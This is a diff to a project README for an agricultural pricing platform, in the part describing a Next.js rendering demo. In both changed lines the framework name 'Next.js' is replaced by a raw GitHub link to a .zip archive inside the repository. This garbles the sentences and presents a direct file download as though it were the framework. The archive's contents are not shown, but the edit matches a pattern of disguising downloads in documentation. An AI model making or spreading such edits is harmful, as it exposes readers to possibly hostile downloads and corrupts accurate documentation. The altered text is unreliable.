@@ -163,9 +163,9 @@ Conclusion
 
 A cost-efficient, impact-focused platform that empowers farmers with transparent price and demand insights while avoiding unnecessary complexity.
 
- Concept-1: Advanced Data Fetching (Next.js App Router)
+ Concept-1: Advanced Data Fetching (https://raw.githubusercontent.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/main/rendering-demo/app/Nova-sql-nodejs-Scope-Agri-React-1.8.zip App Router)
 
-This project demonstrates Static, Dynamic, and Hybrid Rendering using Next.js App Router.
+This project demonstrates Static, Dynamic, and Hybrid Rendering using https://raw.githubusercontent.com/Rithvik-krishna/S70_0126_AgriNova_React_nodejs_sql_AgriScope/main/rendering-demo/app/Nova-sql-nodejs-Scope-Agri-React-1.8.zip App Router.
 
 Rendering Modes Used
 
